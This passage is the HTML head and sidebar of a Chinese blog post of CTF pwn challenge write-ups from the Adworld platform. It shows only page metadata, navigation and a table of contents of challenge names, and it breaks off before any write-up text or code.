<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png">
  <link rel="mask-icon" href="/images/favicon.png" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.0/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">

<script class="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"8.0.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}};
  </script>

  <meta name="description" content="攻防世界——pwn进阶攻防世界的pwn进阶题目的记录">
<meta property="og:type" content="article">
<meta property="og:title" content="攻防世界pwn进阶">
<meta property="og:url" content="http://example.com/posts/5600bec/index.html">
<meta property="og:site_name" content="Lsh">
<meta property="og:description" content="攻防世界——pwn进阶攻防世界的pwn进阶题目的记录">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220180827121.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216091450390.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216091522087.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216091600591.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216091711987.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216091815706.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216092006005.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216092221627.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216093640287.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220180854344.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216093833219.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216094746428.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216094805753.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216094836014.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216095700046.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216095859731.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216100848549.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220180909635.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202164645530.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220180923482.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220181243613.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220183006893.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220183024184.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220190823145.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220191614222.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220194125391.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202165328947.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202165908347.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202170029431.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202165602237.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202171240776.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202171329588.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202171507426.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202171856179.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202172023878.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202172043020.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202172125280.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202172403191.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202173811503.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220204019066.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220204110640.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220204324635.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220205838214.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220210407729.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220210437478.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220210753716.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220211118535.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220211219859.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220211732114.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220211938141.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123223457054.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123223844741.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123224225947.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123224310040.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123231022120.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084832598.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084904525.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123231554223.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209110940322.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209164911452.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209165235082.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209165320208.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209170839114.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209172219756.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209173406970.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209175028067.png">
<meta property="og:image" content="http://example.com/posts/5600bec/image-20201123091050404.png">
<meta property="og:image" content="http://example.com/posts/5600bec/image-20201123091430114.png">
<meta property="og:image" content="http://example.com/posts/5600bec/image-20201123091242758.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123231711816.png">
<meta property="og:image" content="http://example.com/posts/5600bec/image-20201123091319181.png">
<meta property="og:image" content="http://example.com/posts/5600bec/image-20201123091712759.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125083325372.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125083521011.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125083728103.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084015380.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084321047.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084627078.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084651226.png">
<meta property="og:image" content="http://example.com/posts/5600bec/image-20201123094300324.png">
<meta property="og:image" content="http://example.com/posts/5600bec/image-20201123094345375.png">
<meta property="og:image" content="http://example.com/posts/5600bec/image-20201123094603206.png">
<meta property="og:image" content="http://example.com/posts/5600bec/image-20201123094616274.png">
<meta property="og:image" content="http://example.com/posts/5600bec/image-20201123095347070.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209180156575.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125094546610.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201204833485.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201205229762.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209085535031.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209085719874.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209090009791.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209090448566.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209091546640.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209092156695.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125094520178.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209180235402.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201221100516746.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201221100534999.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222171344578.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222172654517.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222172643751.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222171556274.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222175100455.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222182139072.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201221093630034.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201221093644804.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222162245601.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222162413637.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222202509095.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222205731171.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222211533132.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222211642972.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222212109392.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222212557359.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222220954444.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222221013962.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222222940532.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222221324550.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222223555039.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222224732060.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223081129516.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223081203985.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223082332571.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223082737721.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223091146979.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223091348996.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223091552374.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223091611277.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223093330611.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223093513368.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223093614793.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223093659464.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223093802866.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223094116027.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223094827128.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223095301158.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223112047972.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223111914992.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228212021372.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228212100952.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228212129503.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228214540803.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228214648552.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228214824523.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228220305556.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228221651239.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228222925316.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201228224934094.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230182624714.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230182747036.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230183308602.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230183424923.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230185552349.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230185625780.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230185951134.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201211551807.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213201788.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213310802.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213328651.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213346639.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213401902.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213619289.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201214918029.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201222619001.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201223133135.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201223434405.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201225035214.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209094754572.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209095207906.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209095323845.png">
<meta property="og:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209104042184.png">
<meta property="article:published_time" content="2020-11-23T01:09:48.000Z">
<meta property="article:modified_time" content="2020-12-30T11:00:29.775Z">
<meta property="article:author" content="ykx">
<meta property="article:tag" content="攻防世界">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220180827121.png">


<link rel="canonical" href="http://example.com/posts/5600bec/">


<script class="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>攻防世界pwn进阶 | Lsh</title>
  






  <noscript>
  <style>
  body { margin-top: 2rem; }

  .use-motion .menu-item,
  .use-motion .sidebar,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header {
    visibility: visible;
  }

  .use-motion .header,
  .use-motion .site-brand-container .toggle,
  .use-motion .footer { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle,
  .use-motion .custom-logo-image {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line {
    transform: scaleX(1);
  }

  .search-pop-overlay, .sidebar-nav { display: none; }
  .sidebar-panel { display: block; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Lsh</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <section class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94pwn%E8%BF%9B%E9%98%B6"><span class="nav-number">1.</span> <span class="nav-text">攻防世界——pwn进阶</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-forgot"><span class="nav-number">1.1.</span> <span class="nav-text">1.forgot</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">1.1.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8"><span class="nav-number">1.1.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Mary-Morton"><span class="nav-number">1.2.</span> <span class="nav-text">2.Mary_Morton</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-warmup"><span class="nav-number">1.3.</span> <span class="nav-text">3.warmup</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-welpwn"><span class="nav-number">1.4.</span> <span class="nav-text">4.welpwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-2"><span class="nav-number">1.4.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-2"><span class="nav-number">1.4.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-monkey"><span class="nav-number">1.5.</span> <span class="nav-text">5.monkey</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-time-formatter"><span class="nav-number">1.6.</span> <span class="nav-text">6.time_formatter</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-3"><span class="nav-number">1.6.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-3"><span class="nav-number">1.6.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-pwn-200"><span class="nav-number">1.7.</span> <span class="nav-text">7.pwn-200</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-4"><span class="nav-number">1.7.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-4"><span class="nav-number">1.7.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-pwn1"><span class="nav-number">1.8.</span> <span class="nav-text">8.pwn1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-5"><span class="nav-number">1.8.1.</span> <span class="nav-text">代码分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-note-service2"><span class="nav-number">1.9.</span> <span class="nav-text">9.note-service2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-6"><span class="nav-number">1.9.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-5"><span class="nav-number">1.9.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-pwn-100"><span class="nav-number">1.10.</span> <span class="nav-text">10.pwn-100</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-7"><span class="nav-number">1.10.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-6"><span class="nav-number">1.10.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6"><span class="nav-number">1.11.</span> <span class="nav-text">11.反应釜开关控制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-8"><span class="nav-number">1.11.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-7"><span class="nav-number">1.11.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#12-%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B"><span class="nav-number">1.12.</span> <span class="nav-text">12.实时数据监测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-9"><span class="nav-number">1.12.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%88%A9%E7%94%A8-8"><span class="nav-number">1.12.2.</span> <span class="nav-text">思路及利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#13-dice-game"><span class="nav-number">1.13.</span> <span class="nav-text">13.dice_game</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" 